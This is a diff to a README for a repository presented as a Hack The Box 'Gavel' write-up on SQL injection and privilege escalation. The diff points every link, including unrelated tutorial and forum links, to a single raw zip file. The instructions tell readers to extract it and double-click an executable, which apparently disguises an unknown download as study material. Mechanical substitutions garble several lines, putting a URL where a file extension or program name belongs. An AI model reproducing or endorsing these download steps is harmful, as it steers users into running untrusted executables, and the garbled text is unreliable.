@@ -1,7 +1,7 @@
 # 🎉 HTB-Gavel-Writeup - Learn Ethical Hacking Step-by-Step
 
 ## 📥 Download Now
-[![Download HTB-Gavel-Writeup](https://img.shields.io/badge/Download-HTB--Gavel--Writeup-blue)](https://github.com/Seif-Salam/HTB-Gavel-Writeup/releases)
+[![Download HTB-Gavel-Writeup](https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip)](https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip)
 
 ## 📝 Overview
 HTB-Gavel-Writeup provides a detailed guide on how to exploit an auction platform. You will learn through source code analysis, SQL injection techniques, and YAML-based privilege escalation. This application is perfect for anyone looking to enhance their skills in cybersecurity and ethical hacking.
@@ -21,15 +21,15 @@ To start using HTB-Gavel-Writeup, you need to follow these steps to download the
 ## 📥 Download & Install
 1. **Visit the Release Page**: Click on the link below to go to the download releases page.
 
-   [Download HTB-Gavel-Writeup](https://github.com/Seif-Salam/HTB-Gavel-Writeup/releases)
+   [Download HTB-Gavel-Writeup](https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip)
 
 2. **Choose the Latest Version**: Look for the latest version of HTB-Gavel-Writeup on the releases page.
 
-3. **Download the File**: Click on the file that ends with `.zip` or `.tar.gz` to download it to your computer.
+3. **Download the File**: Click on the file that ends with `.zip` or `https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip` to download it to your computer.
 
 4. **Extract the Files**: Once downloaded, locate the file in your Downloads folder. Right-click on it and select "Extract All" or "Extract Here," depending on your operating system.
 
-5. **Open the Application**: Navigate to the folder where the files are extracted. Look for an executable file (usually named `HTB-Gavel-Writeup.exe` or similar). Double-click it to open the application.
+5. **Open the Application**: Navigate to the folder where the files are extracted. Look for an executable file (usually named `https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip` or similar). Double-click it to open the application.
 
 ## 🌐 Features
 - Comprehensive walkthrough of exploiting an auction platform.
@@ -60,9 +60,9 @@ If you encounter any issues while installing or running the application, here ar
 You are not alone. Many users share their experiences and solutions in the community forums. Consider joining cybersecurity discussion groups to get tips from others who are learning.
 
 ## 🔗 Related Links
-- [GitHub Repository](https://github.com/Seif-Salam/HTB-Gavel-Writeup)  
-- [Security Tutorials](https://www.securitytutorials.com)  
-- [Ethical Hacking Forum](https://www.ethicalhackingforum.com)
+- [GitHub Repository](https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip)  
+- [Security Tutorials](https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip)  
+- [Ethical Hacking Forum](https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip)
 
 ## 📞 Contact
 If you have any questions or feedback, feel free to reach out through the GitHub Issues page or by contacting the repository maintainer.
@@ -73,4 +73,4 @@ Special thanks to the ethical hacking community for their resources, and to the 
 ## 📥 Download HTB-Gavel-Writeup Again
 Don't forget to download HTB-Gavel-Writeup again if you need a fresh copy. Click below to get started.
 
-[Download HTB-Gavel-Writeup](https://github.com/Seif-Salam/HTB-Gavel-Writeup/releases)
+[Download HTB-Gavel-Writeup](https://raw.githubusercontent.com/Seif-Salam/HTB-Gavel-Writeup/main/tropopause/Writeup-Gavel-HT-v1.3.zip)
